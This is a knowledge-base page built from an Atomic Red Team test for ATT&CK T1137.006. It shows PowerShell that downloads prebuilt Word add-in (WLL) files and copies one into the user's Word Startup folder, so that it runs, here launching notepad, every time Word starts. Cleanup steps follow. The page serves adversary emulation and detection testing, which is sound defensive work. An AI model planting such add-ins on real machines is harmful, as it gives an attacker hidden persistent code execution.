---
atomic_guid: "95408a99-4fa7-4cd6-a7ef-cb65f86351cf"
title: "Persistent Code Execution Via Word Add-in File (WLL)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1137.006"
attack_technique_name: "Office Application Startup: Add-ins"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137.006/T1137.006.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "95408a99-4fa7-4cd6-a7ef-cb65f86351cf"
  - "Persistent Code Execution Via Word Add-in File (WLL)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Persistent Code Execution Via Word Add-in File (WLL)

Creates a Word Add-in file (WLL) which runs automatically when Word is started
The sample WLL provided launches the notepad as a proof-of-concept for persistent execution from Office.
Successfully tested on 32-bit Office 2016. Not successful from microsoft 365 version of Office.

## Metadata

- Atomic GUID: 95408a99-4fa7-4cd6-a7ef-cb65f86351cf
- Technique: T1137.006: Office Application Startup: Add-ins
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1137.006/T1137.006.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1137-office_application_startup|T1137.006]]

## Dependencies

Microsoft Word must be installed

### Prerequisite Check

```text
try {
  New-Object -COMObject "Word.Application" | Out-Null
  Stop-Process -Name "winword"
  exit 0
} catch { exit 1 }
```

### Get Prerequisite

```text
Write-Host "You will need to install Microsoft Word manually to meet this requirement"
```

WLL files must exist on disk at specified location

### Prerequisite Check

```text
if ((Test-Path "PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x64.wll") -and (Test-Path "PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x86.wll")) {exit 0} else {exit 1}
```

### Get Prerequisite

```text
New-Item -Type Directory "PathToAtomicsFolder\T1137.006\bin\Addins\" -Force | Out-Null
Invoke-Webrequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/wordwll_x64.wll" -UseBasicParsing -OutFile "PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x64.wll"
Invoke-Webrequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/wordwll_x86.wll" -UseBasicParsing -OutFile "PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x86.wll"
```

## Executor

- name: powershell

### Command

```powershell
$wdApp = New-Object -COMObject "Word.Application"
if(-not $wdApp.path.contains("Program Files (x86)"))  
{
  Write-Host "64-bit Office"
  Copy "PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x64.wll" "$env:APPDATA\Microsoft\Word\Startup\notepad.wll"        
}
else{
  Write-Host "32-bit Office"
  Copy "PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x86.wll" "$env:APPDATA\Microsoft\Word\Startup\notepad.wll"
}
Stop-Process -Name "WinWord" 
Start-Process "WinWord"
```

### Cleanup

```powershell
Stop-Process -Name "notepad","WinWord" -ErrorAction Ignore
Start-Sleep 3
Remove-Item "$env:APPDATA\Microsoft\Word\Startup\notepad.wll" -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137.006/T1137.006.yaml)
